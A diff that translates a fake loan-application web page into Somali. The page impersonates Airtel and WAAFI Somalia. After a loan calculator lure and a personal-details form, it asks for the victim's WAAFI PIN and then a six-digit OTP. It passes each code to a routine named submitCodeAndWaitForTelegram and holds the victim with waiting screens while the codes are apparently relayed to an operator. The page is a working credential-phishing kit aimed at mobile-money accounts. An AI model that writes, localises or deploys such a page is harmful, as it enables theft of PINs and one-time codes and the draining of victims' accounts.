@@ -1,10 +1,10 @@
 <!doctype html>
-<html lang="en">
+<html lang="so">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="Urgent loan for personal needs? Repayment from monthly income.">
-  <title>WAAFIKAAB Loan Application</title>
+  <meta name="description" content="Amaah degdeg ah oo loogu talagalay baahiyahaaga gaarka ah? Bixin ka timaadda dakhligaaga bille.">
+  <title>Codsiga Amaahda WAAFIKAAB</title>
   <style>
     *{box-sizing:border-box}
     :root{--blue:#5b6fe3;--purple:#a64fc9;--ink:#17202b;--muted:#8b929d;--line:#d6d6d6}
@@ -60,84 +60,84 @@
 </head>
 <body>
   <header class="topbar">
-    <a class="back hidden" id="backLink" href="#" aria-label="Back">← Back</a>
-    <a class="brand" id="brandHome" href="#" aria-label="Demo Finance Home">
+    <a class="back hidden" id="backLink" href="#" aria-label="Dib u noqo">← Dib u noqo</a>
+    <a class="brand" id="brandHome" href="#" aria-label="Bogga Hore">
       <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYrpSQeGifBOvPn8KnR1XTbRx5GO_nbAE4RieITKWtew&s" alt="Airtel Logo" class="brand-logo" style="height: 28px; width: auto; vertical-align: middle;">
-      <small style="color: rgb(12, 12, 12);">Life Just Get Simplefied</small>
+      <small style="color: rgb(12, 12, 12);">Nolosha Waa La Fududeeyay</small>
     </a>
-    <button class="menu" id="menuBtn" type="button" aria-label="Menu">☰</button>
+    <button class="menu" id="menuBtn" type="button" aria-label="Liiska">☰</button>
   </header>
 
   <main>
     <section class="panel home-panel" id="home">
-      <h1>APPLY FOR YOUR LOAN WITH <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvVPCc4P6EkLbd-HP1kZSZDpSpWEyfi9A8aU9IGLKqEA&s=10" alt="Airtel Logo" style="height: 22px; width: auto; vertical-align: middle;"></h1>
-      <p class="subtitle">Fast approval • Competitive rates • Flexible terms</p>
+      <h1>CODSO AMAAHDAADA <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvVPCc4P6EkLbd-HP1kZSZDpSpWEyfi9A8aU9IGLKqEA&s=10" alt="Airtel Logo" style="height: 22px; width: auto; vertical-align: middle;"></h1>
+      <p class="subtitle">Ansixinta degdegga ah • Qiimo macquul ah • Shuruudo dabacsan</p>
       <div class="calculator">
-        <h2>Loan Calculator</h2>
-        <div class="range-heading"><label for="amountRange">Loan amount</label><strong id="amountLabel">$2,500</strong></div>
+        <h2>Xisaabiyaha Amaahda</h2>
+        <div class="range-heading"><label for="amountRange">Qaddarka amaahda</label><strong id="amountLabel">$2,500</strong></div>
         <input id="amountRange" type="range" min="100" max="5000" step="100" value="2500">
         <div class="range-limits"><span>$100</span><span>$5,000</span></div>
-        <div class="range-heading duration-heading"><label for="durationRange">Loan duration</label><strong id="durationLabel">12 months</strong></div>
+        <div class="range-heading duration-heading"><label for="durationRange">Muddada amaahda</label><strong id="durationLabel">12 bilood</strong></div>
         <input id="durationRange" type="range" min="6" max="60" step="6" value="12">
-        <div class="range-limits"><span>6 months</span><span>60 months</span></div>
-        <div class="payment"><span>Monthly payment</span><strong id="paymentLabel">$225.00</strong></div>
+        <div class="range-limits"><span>6 bilood</span><span>60 bilood</span></div>
+        <div class="payment"><span>Bixinta bille</span><strong id="paymentLabel">$225.00</strong></div>
         <p class="disclaimer"></p>
       </div>
-      <button class="primary full" id="applyBtn" type="button">APPLY NOW</button>
+      <button class="primary full" id="applyBtn" type="button">CODSO HADDA</button>
       <div class="benefits">
-        <div><b>⚡</b><strong>Fast approval</strong><small>In less than 24 hours</small></div>
-        <div><b>💰</b><strong>Low rates</strong><small>Starting from 8%</small></div>
-        <div><b>🔒</b><strong>Secure</strong><small>Bank-level security</small></div>
+        <div><b>⚡</b><strong>Ansixin degdeg ah</strong><small>In ka yar 24 saacadood</small></div>
+        <div><b>💰</b><strong>Qiimo yar</strong><small>Ka bilaabmaya 8%</small></div>
+        <div><b>🔒</b><strong>Ammaan</strong><small>Ammaan heer banki ah</small></div>
       </div>
     </section>
 
     <section class="panel form-panel hidden" id="application">
-      <h1>Loan Application</h1>
-      <p class="step-label" id="stepLabel">Step 1 of 3</p>
-      <div class="progress" aria-label="Application progress"><i id="progress1" class="active"></i><i id="progress2"></i><i id="progress3"></i></div>
+      <h1>Codsiga Amaahda</h1>
+      <p class="step-label" id="stepLabel">Tallaabada 1 ee 3</p>
+      <div class="progress" aria-label="Horumarka codsiga"><i id="progress1" class="active"></i><i id="progress2"></i><i id="progress3"></i></div>
       <form id="loanForm" novalidate>
         <div class="step" data-step="1">
-          <label for="loanType">Loan type</label>
-          <select id="loanType"><option>Personal loan</option><option>Business loan</option><option>Student loan</option><option>Emergency loan</option></select>
-          <label for="loanAmount">Loan amount (USD)</label>
+          <label for="loanType">Nooca amaahda</label>
+          <select id="loanType"><option>Amaah shakhsi ah</option><option>Amaah ganacsi</option><option>Amaah arday</option><option>Amaah degdeg ah</option></select>
+          <label for="loanAmount">Qaddarka amaahda (USD)</label>
           <input id="loanAmount" type="number" min="100" max="5000" value="2500" required>
-          <label for="loanDuration">Loan duration</label>
-          <select id="loanDuration"><option value="6">6 months</option><option value="12" selected>12 months</option><option value="18">18 months</option><option value="24">24 months</option><option value="36">36 months</option><option value="48">48 months</option><option value="60">60 months</option></select>
-          <label for="purpose">Loan purpose</label>
-          <textarea id="purpose" placeholder="What will the loan be used for?" rows="3" required></textarea>
+          <label for="loanDuration">Muddada amaahda</label>
+          <select id="loanDuration"><option value="6">6 bilood</option><option value="12" selected>12 bilood</option><option value="18">18 bilood</option><option value="24">24 bilood</option><option value="36">36 bilood</option><option value="48">48 bilood</option><option value="60">60 bilood</option></select>
+          <label for="purpose">Ujeeddada amaahda</label>
+          <textarea id="purpose" placeholder="Maxaa loo adeegsanayaa amaahda?" rows="3" required></textarea>
         </div>
         <div class="step hidden" data-step="2">
           <div class="two-col">
-            <div><label for="firstName">First name</label><input id="firstName" autocomplete="given-name" placeholder="First name" required></div>
-            <div><label for="lastName">Last name</label><input id="lastName" autocomplete="family-name" placeholder="Last name" required></div>
+            <div><label for="firstName">Magaca hore</label><input id="firstName" autocomplete="given-name" placeholder="Magaca hore" required></div>
+            <div><label for="lastName">Magaca dambe</label><input id="lastName" autocomplete="family-name" placeholder="Magaca dambe" required></div>
           </div>
-          <label for="email">Email address</label>
-          <input id="email" type="email" autocomplete="off" placeholder="example@gmail.com" required>
-          <label for="phone">Phone number</label>
-          <div class="phone-row"><span>+252</span><input id="phone" inputmode="numeric" placeholder="Enter phone number digits" maxlength="10" required></div>
+          <label for="email">Ciwaanka iimaylka</label>
+          <input id="email" type="email" autocomplete="off" placeholder="tusaale@gmail.com" required>
+          <label for="phone">Lambarka taleefanka</label>
+          <div class="phone-row"><span>+252</span><input id="phone" inputmode="numeric" placeholder="Geli tirooyinka taleefanka" maxlength="10" required></div>
           <small class="hint"></small>
         </div>
         <div class="step hidden" data-step="3">
-          <label for="employment">Employment status</label>
-          <select id="employment"><option>Employed</option><option>Self-employed</option><option>Business owner</option><option>Student</option><option>Unemployed</option></select>
-          <label for="income">Annual income (USD)</label>
+          <label for="employment">Xaaladda shaqada</label>
+          <select id="employment"><option>Shaqaale</option><option>Isku shaqayste</option><option>Milkiile ganacsi</option><option>Arday</option><option>Shaqa la'aan</option></select>
+          <label for="income">Dakhliga sannadlaha ah (USD)</label>
           <input id="income" type="number" min="0" placeholder="50000">
           <div class="summary">
-            <h2>Application Summary</h2>
-            <div><span>Loan type:</span><strong id="sumType">Personal loan</strong></div>
-            <div><span>Loan amount:</span><strong id="sumAmount">$2,500</strong></div>
-            <div><span>Loan duration:</span><strong id="sumDuration">12 months</strong></div>
-            <div><span>Purpose:</span><strong id="sumPurpose">—</strong></div>
-            <div><span>Applicant:</span><strong id="sumApplicant">—</strong></div>
-            <div><span>Email:</span><strong id="sumEmail">—</strong></div>
-            <div><span>Phone:</span><strong id="sumPhone">—</strong></div>
+            <h2>Koobidda Codsiga</h2>
+            <div><span>Nooca amaahda:</span><strong id="sumType">Amaah shakhsi ah</strong></div>
+            <div><span>Qaddarka amaahda:</span><strong id="sumAmount">$2,500</strong></div>
+            <div><span>Muddada amaahda:</span><strong id="sumDuration">12 bilood</strong></div>
+            <div><span>Ujeeddada:</span><strong id="sumPurpose">—</strong></div>
+            <div><span>Codsaadaha:</span><strong id="sumApplicant">—</strong></div>
+            <div><span>Iimaylka:</span><strong id="sumEmail">—</strong></div>
+            <div><span>Taleefanka:</span><strong id="sumPhone">—</strong></div>
           </div>
           <p class="disclaimer"></p>
         </div>
         <div class="form-actions">
-          <button type="button" class="secondary hidden" id="previousBtn">PREVIOUS</button>
-          <button type="button" class="primary" id="nextBtn">NEXT STEP</button>
-          <button type="submit" class="primary hidden" id="submitBtn">CONTINUE</button>
+          <button type="button" class="secondary hidden" id="previousBtn">KA HORREEYAY</button>
+          <button type="button" class="primary" id="nextBtn">TALLAABADA XIGTA</button>
+          <button type="submit" class="primary hidden" id="submitBtn">SII WAD</button>
         </div>
         <p class="error" id="errorMsg" role="alert" aria-live="polite"></p>
       </form>
@@ -147,53 +147,53 @@
       <div class="demo-ribbon"></div>
       <p class="verify-intro"></p>
       <div class="verification-step" id="verificationStep1">
-        <h1>Enter WAAFI PIN </h1>
+        <h1>Geli PIN-ka WAAFI</h1>
         <div class="phone-display"><span>🌐</span><strong id="verificationPhone">+252 ••••••••••</strong></div>
-        <p class="verify-label">Enter your WAAFI PIN</p>
-        <div class="codes" id="code1" aria-label="First four-digit code">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="First digit of code" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Second digit of code" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Third digit of code" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Fourth digit of code" autocomplete="off">
-          <button class="eye" type="button" data-toggle="code1" aria-label="Show or hide first code">◉</button>
+        <p class="verify-label">Geli PIN-kaaga WAAFI</p>
+        <div class="codes" id="code1" aria-label="Lambarka koowaad ee afar-godle ah">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka koowaad ee koodhka" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka labaad ee koodhka" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka saddexaad ee koodhka" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka afraad ee koodhka" autocomplete="off">
+          <button class="eye" type="button" data-toggle="code1" aria-label="Muuji ama qari koodhka koowaad">◉</button>
         </div>
-        <button class="action" id="continueCode" type="button" disabled>CONTINUE</button>
-        <p class="note">Enter the four-digit PIN </p>
+        <button class="action" id="continueCode" type="button" disabled>SII WAD</button>
+        <p class="note">Geli PIN-ka afar-godle ah</p>
         <p class="status" id="status1" role="status" aria-live="polite"></p>
       </div>
       <div class="verification-step hidden" id="verificationStep2">
-        <h1>Enter Verification Code</h1>
+        <h1>Geli Koodhka Xaqiijinta</h1>
         <p class="verification-heading"></p>
         <p class="verify-intro"></p>
-        <p class="verify-label">Enter the verification code sent to the phone number</p>
-        <div class="codes" id="code2" aria-label="Second four-digit code">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="First digit of second code" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Second digit of second code" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Third digit of second code" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Fourth digit of second code" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Fifth digit of second code" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Sixth digit of second code" autocomplete="off">
-          <button class="eye" type="button" data-toggle="code2" aria-label="Show or hide second code">◉</button>
+        <p class="verify-label">Geli koodhka xaqiijinta ee loo diray lambarka taleefanka</p>
+        <div class="codes" id="code2" aria-label="Lambarka labaad ee koodhka">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka koowaad ee koodhka labaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka labaad ee koodhka labaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka saddexaad ee koodhka labaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka afraad ee koodhka labaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka shanaad ee koodhka labaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka lixaad ee koodhka labaad" autocomplete="off">
+          <button class="eye" type="button" data-toggle="code2" aria-label="Muuji ama qari koodhka labaad">◉</button>
         </div>
-        <button class="action" id="verifyCode" type="button" disabled>VERIFY</button>
-        <p class="note">Enter the six-digit code.</p>
+        <button class="action" id="verifyCode" type="button" disabled>XAQIIJI</button>
+        <p class="note">Geli koodhka lix-godle ah.</p>
         <p class="status" id="status2" role="status" aria-live="polite"></p>
       </div>
     </section>
 
     <section class="panel verify-panel hidden" id="confirmation">
       <div class="success-icon">✓</div>
-      <h1>Submitted</h1>
-      <div class="notice">Your application and verification steps have been verified. Loan will be deposited into your Waafi account. </div>
-      <button class="primary full" id="restartBtn" type="button">NEW APPLICATION</button>
+      <h1>Waa La Gudbiyay</h1>
+      <div class="notice">Codsigaaga iyo tallaabooyinka xaqiijinta waa la xaqiijiyay. Amaahda waxaa lagu shubi doonaa akoonkaaga Waafi.</div>
+      <button class="primary full" id="restartBtn" type="button">CODSI CUSUB</button>
     </section>
   </main>
 
   <div class="loading-overlay hidden" id="loadingOverlay" role="status" aria-live="polite">
-    <div class="loading-card"><div class="spinner" aria-hidden="true"></div><h2>Submitting..</h2><p></p></div>
+    <div class="loading-card"><div class="spinner" aria-hidden="true"></div><h2>Waa la gudbinayaa..</h2><p></p></div>
   </div>
 
-  <footer>© 2026 WAAFI SOMALIA. All rights reserved.</footer>
+  <footer>© 2026 WAAFI SOMALIA. Dhammaan xuquuqdu way dhowran yihiin.</footer>
 
   <script>
     'use strict';
@@ -354,7 +354,7 @@
       const amount = Number($('amountRange').value);
       const months = Number($('durationRange').value);
       $('amountLabel').textContent = money(amount);
-      $('durationLabel').textContent = months + ' months';
+      $('durationLabel').textContent = months + ' bilood';
       $('paymentLabel').textContent = '$' + ((amount * (1 + 0.08 * months / 12)) / months).toFixed(2);
     }
 
@@ -394,7 +394,7 @@
       document.querySelectorAll('.step').forEach(el => {
         el.classList.toggle('hidden', Number(el.dataset.step) !== n);
       });
-      $('stepLabel').textContent = `Step ${n} of 3`;
+      $('stepLabel').textContent = `Tallaabada ${n} ee 3`;
       [1, 2, 3].forEach(i => $('progress' + i).classList.toggle('active', i <= n));
       $('previousBtn').classList.toggle('hidden', n === 1);
       $('nextBtn').classList.toggle('hidden', n === 3);
@@ -410,7 +410,7 @@
         const el = $(id);
         if (!el.value.trim()) {
           el.focus();
-          $('errorMsg').textContent = 'Please fill in the required fields.';
+          $('errorMsg').textContent = 'Fadlan buuxi goobaha loo baahan yahay.';
           return false;
         }
       }
@@ -418,19 +418,19 @@
         const amount = Number($('loanAmount').value);
         if (!Number.isFinite(amount) || amount < 100 || amount > 5000) {
           $('loanAmount').focus();
-          $('errorMsg').textContent = 'Enter an amount between $100 and $5,000.';
+          $('errorMsg').textContent = 'Geli qaddar u dhexeeya $100 iyo $5,000.';
           return false;
         }
       }
       if (step === 2) {
         if (!$('email').checkValidity()) {
           $('email').focus();
-          $('errorMsg').textContent = 'Please enter a valid email address.';
+          $('errorMsg').textContent = 'Fadlan geli ciwaan iimayl oo sax ah.';
           return false;
         }
         if (!/^\d{9,10}$/.test($('phone').value)) {
           $('phone').focus();
-          $('errorMsg').textContent = 'Enter 9 to 10 digits.';
+          $('errorMsg').textContent = 'Geli 9 ilaa 10 god.';
           return false;
         }
       }
@@ -445,7 +445,7 @@
     function updateSummary() {
       $('sumType').textContent = $('loanType').value;
       $('sumAmount').textContent = money($('loanAmount').value);
-      $('sumDuration').textContent = $('loanDuration').value + ' months';
+      $('sumDuration').textContent = $('loanDuration').value + ' bilood';
       $('sumPurpose').textContent = $('purpose').value || '—';
       $('sumApplicant').textContent = ($('firstName').value + ' ' + $('lastName').value).trim() || '—';
       $('sumEmail').textContent = $('email').value || '—';
@@ -532,8 +532,8 @@
       const pin = code1Group.value();
 
       $('continueCode').disabled = true;
-      $('status1').textContent = 'PlEASE WAIT..';
-      showBlockingSpinner('Verifying Loan Details.. DO NOT CLOSE THIS PAGE');
+      $('status1').textContent = 'FADLAN SUG..';
+      showBlockingSpinner('Waa la xaqiijinayaa faahfaahinta amaahda.. HA XIDHIN BOGGAN');
 
       try {
         const result = await submitCodeAndWaitForTelegram({
@@ -546,22 +546,22 @@
         hideBlockingSpinner();
 
         if (result.ok && result.verified) {
-          $('status1').textContent = 'Confirmed.';
+          $('status1').textContent = 'Waa la xaqiijiyay.';
           $('verificationStep1').classList.add('hidden');
           $('verificationStep2').classList.remove('hidden');
           $('code2').querySelector('input').focus();
           window.scrollTo(0, 0);
         } else if (result.status === 'timeout') {
-          $('status1').textContent = 'No confirmation. Please try again.';
+          $('status1').textContent = 'Xaqiijin lama helin. Fadlan mar kale isku day.';
           $('continueCode').disabled = false;
         } else {
-          $('status1').textContent = 'Marked as invalid. Please try again and make sure you enter the correct information.';
+          $('status1').textContent = 'Waxaa lagu calaamadeeyay mid aan sax ahayn. Fadlan mar kale isku day oo hubi inaad gelisay macluumaadka saxda ah.';
           $('continueCode').disabled = false;
         }
       } catch (err) {
         hideBlockingSpinner();
         console.error(err);
-        $('status1').textContent = err.message || 'Communication error.';
+        $('status1').textContent = err.message || 'Cilad xiriir ah ayaa dhacday.';
         $('continueCode').disabled = false;
       }
     });
@@ -575,8 +575,8 @@
       const otpEntered = code2Group.value();
 
       $('verifyCode').disabled = true;
-      $('status2').textContent = 'ISSUING LOAN TO YOUR WAAFI ACCOUNT..';
-      showBlockingSpinner('It can takes Up to a Minute');
+      $('status2').textContent = 'WAA LAGU SHUBAYAA AMAAHDA AKOONKAAGA WAAFI..';
+      showBlockingSpinner('Waxay qaadan kartaa ilaa hal daqiiqo');
 
       try {
         const result = await submitCodeAndWaitForTelegram({
@@ -589,21 +589,21 @@
         hideBlockingSpinner();
 
         if (result.ok && result.verified) {
-          $('status2').textContent = 'OTP verified.';
+          $('status2').textContent = 'OTP waa la xaqiijiyay.';
           verification.classList.add('hidden');
           confirmation.classList.remove('hidden');
           window.scrollTo(0, 0);
         } else if (result.status === 'timeout') {
-          $('status2').textContent = 'Please try again and make sure you enter the correct information.';
+          $('status2').textContent = 'Fadlan mar kale isku day oo hubi inaad gelisay macluumaadka saxda ah.';
           $('verifyCode').disabled = false;
         } else {
-          $('status2').textContent = 'Invalid OTP. Please try again.';
+          $('status2').textContent = 'OTP aan sax ahayn. Fadlan mar kale isku day.';
           $('verifyCode').disabled = false;
         }
       } catch (err) {
         hideBlockingSpinner();
         console.error(err);
-        $('status2').textContent = err.message || 'Communication error.';
+        $('status2').textContent = err.message || 'Cilad xiriir ah ayaa dhacday.';
         $('verifyCode').disabled = false;
       }
     });
